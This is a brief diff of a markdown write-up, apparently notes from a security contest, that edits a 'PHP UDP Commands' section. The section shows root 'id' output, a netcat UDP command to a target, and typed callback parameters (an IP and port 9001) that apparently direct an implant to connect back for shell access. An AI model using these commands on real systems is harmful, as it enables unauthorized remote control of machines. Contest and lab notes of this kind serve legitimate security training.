@@ -49,9 +49,10 @@ The Private SSH key loaded will be distributed through another channel.
   uid=0(root) gid=0(root) groups=0(root)
   ```
 !! PHP UDP Commands
+  * start a net cat listener
   * ```
   ┌──(root㉿dragon)-[~/UnnamedSecurityContest/Beachhead]
-└─# nc -u 10.10.1.36 10000
+└─# nc -u IP 10000 OR 32746
 ip 10.10.1.34
 10.10.1.34
 port 9001
